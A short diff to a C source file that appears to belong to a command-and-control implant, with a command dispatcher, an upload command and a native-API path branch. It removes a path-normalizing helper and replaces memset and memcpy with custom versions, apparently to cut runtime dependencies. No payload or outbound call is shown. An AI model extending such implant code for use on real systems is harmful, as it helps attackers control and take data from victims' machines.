@@ -6,38 +6,15 @@
 #include "Defs.h"
 #include "Core.h"
 #include "Asm.h"
+#include "Utilities.h"
 
 #include <tchar.h>
-#include <stdio.h>
+
 
 #define RVNT_COMMAND_LENGTH 5
 
-
 #if CONFIG_NATIVE
-void normalize_path(char* path) {
-    const char prefix[] = "\\??\\";
-    const char separator[] = "\\";
-    const char* drive_letter = strchr(path, ':');
-    char *p = path;
 
-    int i;
-    while (*p != '\0') {
-        if (*p == '/')
-            *p = separator[0];
-        p++;
-    }
-    if (drive_letter != NULL) {
-        // Add the prefix for drive paths
-        memmove(path + strlen(prefix), path, strlen(path) + 1);
-        memcpy(path, prefix, strlen(prefix));
-    } else {
-        // Add the prefix for non-drive paths
-        const char* unc_prefix = "\\";
-        memmove(path + strlen(prefix) + strlen(unc_prefix), path, strlen(path) + 1);
-        memcpy(path, prefix, strlen(prefix));
-        memcpy(path + strlen(prefix), unc_prefix, strlen(unc_prefix));
-    }
-}
 #endif
 
 RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
@@ -123,7 +100,7 @@ VOID CommandDispatcher() {
                 }
             } while ( Parser.Length > 4 );
 
-            memset(DataBuffer, 0, DataSize);
+            mem_set(DataBuffer, 0, DataSize);
             LocalFree(*(PVOID *)DataBuffer);
             DataBuffer = NULL;
 
@@ -228,7 +205,7 @@ VOID CommandUpload( PPARSER Parser ) {
     NTSTATUS status;
     UNICODE_STRING file_path;
     char file_name[MAX_PATH] = { 0 };
-    memcpy(file_name,FileName, NameSize - 1);
+    mem_cpy(file_name,FileName, NameSize - 1);
     NameSize = NameSize - 1;
 
     // FIX THIS STRING
